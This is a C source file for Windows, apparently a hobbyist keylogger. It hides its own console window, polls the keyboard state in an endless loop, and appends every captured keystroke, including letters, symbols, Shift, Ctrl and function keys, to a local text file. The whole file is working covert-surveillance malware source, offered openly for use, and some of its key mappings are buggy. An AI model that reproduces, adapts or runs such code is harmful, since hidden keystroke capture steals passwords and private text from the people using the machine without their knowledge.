#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdbool.h>
#include<conio.h>
#include <unistd.h>
	void hide_the_console(){
	HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );  //won't hide the window without SW_MINIMIZE
    ShowWindow( hWnd, SW_HIDE );}

 
//////////////////////////////// check key//////////////////////////////////////////////////////////////////////
int check_Shift(){
if	((GetKeyState(VK_SHIFT) & 0x8000) == 0x8000){return 1; }// shift on return 1, else return 0;
	return 0;
}
int check_Caps(){
		if ((GetAsyncKeyState(VK_CAPITAL))){return 1;}// Caps lock on return 1, else return 0;
	return 0;
}
int main(){

hide_the_console(); 
	int time=300;// to record exactly, you need to change it. sometime my progarm do not record acuarately, this number belong to your computer( sorry about my english:)))
	do{ 
	//this function hide your consolve screen. if u want to hide it, please usmask this funtion. turn off in task manager
	FILE *file1;
	file1=fopen("C:\\Users\\ADMIN\\3D Objects\\keylogger\\keylogger.txt","a+");
       /// check special key..................
//if// I used information of vitual key code (https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes)
if(check_Shift()==1){fputs("[SHIFT]",file1);Sleep(300);	}
if(check_Caps()==1){fputs("[CAPLOCK]",file1);Sleep(time);}
if(GetAsyncKeyState(VK_BACK)){fputs("[backspaces]",file1);Sleep(time);}
if((GetKeyState(VK_SPACE) & 0x8000) == 0x8000){fputs(" ",file1);Sleep(time);}
if((GetKeyState(VK_TAB) & 0x8000) == 0x8000){fputs("[TAB]",file1);Sleep(time);}
if((GetKeyState(VK_CLEAR) & 0x8000) == 0x8000){fputs("[CLEAR]",file1);Sleep(time);}
if((GetKeyState(VK_RETURN) & 0x8000) == 0x8000){fputs("[ENTER]\n",file1);Sleep(time);}
if((GetKeyState(VK_CONTROL) & 0x8000) == 0x8000){Sleep(300);fputs("[CTRL]",file1);}
if((GetKeyState(VK_MENU) & 0x8000) == 0x8000){fputs("[ALT]",file1);Sleep(time);}
if((GetKeyState(VK_ESCAPE) & 0x8000) == 0x8000){fputs("[ESC]",file1);Sleep(time);return 0;} //if you want to exit, type esc.
if((GetKeyState(VK_PRIOR) & 0x8000) == 0x8000){fputs("[PAGE_UP]",file1);Sleep(time);}
if((GetKeyState(VK_NEXT) & 0x8000) == 0x8000){fputs("[PAGE_DOWN]",file1);Sleep(time);}
if((GetKeyState(VK_END) & 0x8000) == 0x8000){fputs("<[END]>",file1);Sleep(time);}
if((GetKeyState(VK_HOME) & 0x8000) == 0x8000){fputs("<HOME>",file1);Sleep(time);}
if((GetKeyState(VK_LEFT) & 0x8000) == 0x8000){fputs("<[LEFT_ARROW]>",file1);Sleep(time);}
if((GetKeyState(VK_RIGHT) & 0x8000) == 0x8000){fputs("[RIGHT_ARROW]>",file1);Sleep(time);}
if((GetKeyState(VK_UP) & 0x8000) == 0x8000){fputs("[UP_ARROWS]",file1);Sleep(time);}
if((GetKeyState(VK_DOWN) & 0x8000) == 0x8000){fputs("[DOWN_ARROWS]",file1);Sleep(time);}
if((GetKeyState(VK_EXECUTE) & 0x8000) == 0x8000){fputs("[EXECUTE]",file1);Sleep(time);}
if((GetKeyState(VK_SNAPSHOT) & 0x8000) == 0x8000){fputs("[PRT_SC]",file1);Sleep(time);}
if((GetKeyState(VK_INSERT) & 0x8000) == 0x8000){fputs("[INSERT]",file1);Sleep(time);}
if((GetKeyState(VK_DELETE) & 0x8000) == 0x8000){fputs("[DEL]",file1);Sleep(time);}
if((GetKeyState(VK_HELP) & 0x8000) == 0x8000){fputs("[HELP]",file1);Sleep(time);}
if((GetKeyState(VK_F1) & 0x8000) == 0x8000){fputs("[F1]",file1);Sleep(time);}
if((GetKeyState(VK_F2) & 0x8000) == 0x8000){fputs("[F2]",file1);Sleep(time);}
if((GetKeyState(VK_F3) & 0x8000) == 0x8000){fputs("[F3]",file1);Sleep(time);}
if((GetKeyState(VK_F4) & 0x8000) == 0x8000){fputs("[F4]",file1);Sleep(time);}
if((GetKeyState(VK_F5) & 0x8000) == 0x8000){fputs("[F5]",file1);Sleep(time);}
if((GetKeyState(VK_F6) & 0x8000) == 0x8000){fputs("[F6]",file1);Sleep(time);}
if((GetKeyState(VK_F7) & 0x8000) == 0x8000){fputs("[F7]",file1);Sleep(time);}
if((GetKeyState(VK_F8) & 0x8000) == 0x8000){fputs("[F8]",file1);Sleep(time);}
if((GetKeyState(VK_F9) & 0x8000) == 0x8000){fputs("[F9]",file1);Sleep(time);}
if((GetKeyState(VK_F10) & 0x8000) == 0x8000){fputs("[F10]",file1);Sleep(time);}
if((GetKeyState(VK_F11) & 0x8000) == 0x8000){fputs("[F11]",file1);Sleep(time);}
if((GetKeyState(VK_F12) & 0x8000) == 0x8000){fputs("[F12]",file1);Sleep(time);}
if((GetKeyState(0x5B) & 0x8000) == 0x8000){fputs("[WINDOWN]",file1);Sleep(time);}
if((GetKeyState(0x5C) & 0x8000) == 0x8000){fputs("[WINDOWN]",file1);Sleep(time);}
if((GetKeyState(VK_BROWSER_BACK) & 0x8000) == 0x8000){fputs("[BROWSER_BACK]",file1);Sleep(time);}
if((GetKeyState(VK_BROWSER_REFRESH) & 0x8000) == 0x8000){fputs("[BROWSER_REFRESH]",file1);Sleep(time);}
if((GetKeyState(VK_BROWSER_SEARCH) & 0x8000) == 0x8000){fputs("[BROWSER_SEARCH]",file1);Sleep(time);}
if((GetKeyState(VK_BROWSER_FAVORITES) & 0x8000) == 0x8000){fputs("[BROWSER_FAVORITES]",file1);Sleep(time);}
if((GetKeyState(VK_BROWSER_FAVORITES) & 0x8000) == 0x8000){fputs("[BROWSER_FAVORITES]",file1);Sleep(time);}
if((GetKeyState(VK_VOLUME_MUTE) & 0x8000) == 0x8000){fputs("[VOLUME_MUTE]",file1);Sleep(time);}
if((GetKeyState(VK_VOLUME_DOWN) & 0x8000) == 0x8000){fputs("[VOLUME_DOWN]",file1);Sleep(time);}
if((GetKeyState(VK_VOLUME_UP) & 0x8000) == 0x8000){fputs("[VK_VOLUME_UP]",file1);Sleep(time);}
if((GetKeyState(VK_MEDIA_PLAY_PAUSE) & 0x8000) == 0x8000){fputs("[pause]",file1);Sleep(time);}
////check character and number
		////check special character if shift on
	if(check_Shift()==1){
		if((GetKeyState(48) & 0x8000) == 0x8000){fputs(")",file1);Sleep(200);}
		if((GetKeyState(33) & 0x8000) == 0x8000){fputs(")",file1);Sleep(200);}
		if((GetKeyState(50) & 0x8000) == 0x8000){fputs("@",file1);Sleep(200);}
		if((GetKeyState(51) & 0x8000) == 0x8000){fputs("#",file1);Sleep(200);}
		if((GetKeyState(52) & 0x8000) == 0x8000){fputs("$",file1);Sleep(200);}
		if((GetKeyState(53) & 0x8000) == 0x8000){fputs("%",file1);Sleep(200);}
		if((GetKeyState(54) & 0x8000) == 0x8000){fputs("^",file1);Sleep(200);}
		if((GetKeyState(55) & 0x8000) == 0x8000){fputs("&",file1);Sleep(200);}
		if((GetKeyState(56) & 0x8000) == 0x8000){fputs("*",file1);Sleep(200);}
		if((GetKeyState(57) & 0x8000) == 0x8000){fputs("(",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_5) & 0x8000) == 0x8000){fputs("\"",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_PLUS) & 0x8000) == 0x8000){fputs("+",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_COMMA) & 0x8000) == 0x8000){fputs("<",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_MINUS) & 0x8000) == 0x8000){fputs("_",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_PERIOD) & 0x8000) == 0x8000){fputs(">",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_2) & 0x8000) == 0x8000){fputs("?",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_1) & 0x8000) == 0x8000){fputs(":",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_4) & 0x8000) == 0x8000){fputs("{",file1);Sleep(200);}
		if((GetKeyState(VK_OEM_1) & 0x8000) == 0x8000){fputs("}",file1);Sleep(200);}
																						}
///caplock on, shift on
if(check_Shift()==1||check_Caps()==1){
	if((GetKeyState(0x41) & 0x8000) == 0x8000){fputs("A",file1);Sleep(200);}
		if((GetKeyState(0x42) & 0x8000) == 0x8000){fputs("B",file1);Sleep(200);}
		if((GetKeyState(0x43) & 0x8000) == 0x8000){fputs("C",file1);Sleep(200);}
		if((GetKeyState(0x44) & 0x8000) == 0x8000){fputs("D",file1);Sleep(200);}
		if((GetKeyState(0x45) & 0x8000) == 0x8000){fputs("E",file1);Sleep(200);}
		if((GetKeyState(0x46) & 0x8000) == 0x8000){fputs("F",file1);Sleep(200);}
		if((GetKeyState(0x47) & 0x8000) == 0x8000){fputs("G",file1);Sleep(200);}
		if((GetKeyState(0x48) & 0x8000) == 0x8000){fputs("H",file1);Sleep(200);}
		if((GetKeyState(0x49) & 0x8000) == 0x8000){fputs("I",file1);Sleep(200);}
		if((GetKeyState(0x4A) & 0x8000) == 0x8000){fputs("J",file1);Sleep(200);}
		if((GetKeyState(0x4B) & 0x8000) == 0x8000){fputs("K",file1);Sleep(200);}
		if((GetKeyState(0x4C) & 0x8000) == 0x8000){fputs("L",file1);Sleep(200);}
		if((GetKeyState(0x4D) & 0x8000) == 0x8000){fputs("M",file1);Sleep(200);}
		if((GetKeyState(0x4E) & 0x8000) == 0x8000){fputs("N",file1);Sleep(200);}
		if((GetKeyState(0x4F) & 0x8000) == 0x8000){fputs("O",file1);Sleep(200);}
		if((GetKeyState(0x50) & 0x8000) == 0x8000){fputs("P",file1);Sleep(200);}
		if((GetKeyState(0x51) & 0x8000) == 0x8000){fputs("Q",file1);Sleep(200);}
		if((GetKeyState(0x52) & 0x8000) == 0x8000){fputs("R",file1);Sleep(200);}
		if((GetKeyState(0x53) & 0x8000) == 0x8000){fputs("S",file1);Sleep(200);}
		if((GetKeyState(0x54) & 0x8000) == 0x8000){fputs("T",file1);Sleep(200);}
		if((GetKeyState(0x55) & 0x8000) == 0x8000){fputs("U",file1);Sleep(200);}
		if((GetKeyState(0x56) & 0x8000) == 0x8000){fputs("V",file1);Sleep(200);}
		if((GetKeyState(0x57) & 0x8000) == 0x8000){fputs("W",file1);Sleep(200);}
		if((GetKeyState(0x58) & 0x8000) == 0x8000){fputs("X",file1);Sleep(200);}
		if((GetKeyState(0x59) & 0x8000) == 0x8000){fputs("Y",file1);Sleep(200);}
		if((GetKeyState(0x5A) & 0x8000) == 0x8000){fputs("Z",file1);Sleep(200);}
	
	
																									}
//caplock off, shift off
if((GetKeyState(0x41) & 0x8000) == 0x8000){fputs("a",file1);Sleep(200);return 0;}
if((GetKeyState(0x42) & 0x8000) == 0x8000){fputs("b",file1);Sleep(200);}
if((GetKeyState(0x43) & 0x8000) == 0x8000){fputs("c",file1);Sleep(200);}
if((GetKeyState(0x44) & 0x8000) == 0x8000){fputs("d",file1);Sleep(200);}
if((GetKeyState(0x45) & 0x8000) == 0x8000){fputs("e",file1);Sleep(200);}
if((GetKeyState(0x46) & 0x8000) == 0x8000){fputs("f",file1);Sleep(200);}
if((GetKeyState(0x47) & 0x8000) == 0x8000){fputs("g",file1);Sleep(200);}
if((GetKeyState(0x48) & 0x8000) == 0x8000){fputs("h",file1);Sleep(200);}
if((GetKeyState(0x49) & 0x8000) == 0x8000){fputs("i",file1);Sleep(200);}
if((GetKeyState(0x4A) & 0x8000) == 0x8000){fputs("j",file1);Sleep(200);}
if((GetKeyState(0x4B) & 0x8000) == 0x8000){fputs("k",file1);Sleep(200);}
if((GetKeyState(0x4C) & 0x8000) == 0x8000){fputs("l",file1);Sleep(200);}
if((GetKeyState(0x4D) & 0x8000) == 0x8000){fputs("m",file1);Sleep(200);}
if((GetKeyState(0x4E) & 0x8000) == 0x8000){fputs("n",file1);Sleep(200);}
if((GetKeyState(0x4F) & 0x8000) == 0x8000){fputs("o",file1);Sleep(200);}
if((GetKeyState(0x50) & 0x8000) == 0x8000){fputs("p",file1);Sleep(200);}
if((GetKeyState(0x51) & 0x8000) == 0x8000){fputs("q",file1);Sleep(200);}
if((GetKeyState(0x52) & 0x8000) == 0x8000){fputs("r",file1);Sleep(200);}
if((GetKeyState(0x53) & 0x8000) == 0x8000){fputs("s",file1);Sleep(200);}
if((GetKeyState(0x54) & 0x8000) == 0x8000){fputs("t",file1);Sleep(200);}
if((GetKeyState(0x55) & 0x8000) == 0x8000){fputs("u",file1);Sleep(200);}
if((GetKeyState(0x56) & 0x8000) == 0x8000){fputs("v",file1);Sleep(200);}
if((GetKeyState(0x57) & 0x8000) == 0x8000){fputs("w",file1);Sleep(200);}
if((GetKeyState(0x58) & 0x8000) == 0x8000){fputs("x",file1);Sleep(200);}
if((GetKeyState(0x59) & 0x8000) == 0x8000){fputs("y",file1);Sleep(200);}
if((GetKeyState(0x5A) & 0x8000) == 0x8000){fputs("z",file1);Sleep(200);}				
if((GetKeyState(VK_OEM_5) & 0x8000) == 0x8000){fputs("\"",file1);Sleep(200);}
if((GetKeyState(VK_OEM_PLUS) & 0x8000) == 0x8000){fputs("=",file1);Sleep(200);}
if((GetKeyState(VK_OEM_COMMA) & 0x8000) == 0x8000){fputs(",",file1);Sleep(200);}
if((GetKeyState(VK_OEM_MINUS) & 0x8000) == 0x8000){fputs("-",file1);Sleep(200);}
if((GetKeyState(VK_OEM_PERIOD) & 0x8000) == 0x8000){fputs(".",file1);Sleep(200);}
if((GetKeyState(VK_OEM_2) & 0x8000) == 0x8000){fputs("/",file1);Sleep(200);}
if((GetKeyState(VK_OEM_1) & 0x8000) == 0x8000){fputs(";",file1);Sleep(200);}
if((GetKeyState(VK_OEM_4) & 0x8000) == 0x8000){fputs("[",file1);Sleep(200);}
if((GetKeyState(VK_OEM_1) & 0x8000) == 0x8000){fputs("]",file1);Sleep(200);}					
fclose(file1);
	} while(1!=0);
	return 0;
}
